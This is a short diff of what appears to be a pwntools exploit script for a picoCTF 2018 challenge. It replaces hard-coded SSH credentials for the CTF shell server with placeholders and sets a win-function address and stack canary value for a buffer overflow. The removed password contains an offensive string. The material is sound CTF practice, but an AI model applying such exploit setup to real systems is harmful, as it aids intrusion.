@@ -1,6 +1,6 @@
 from pwn import *
 
-s = ssh(host = '2018shell2.picoctf.com', user = 'b3rp', password = '6hit6ler6')
+s = ssh(host = '2018shell2.picoctf.com', user = 'user', password = 'pass')
 
 win_ = 0x80486eb
 canary = "\x52\x67\x63\x64"
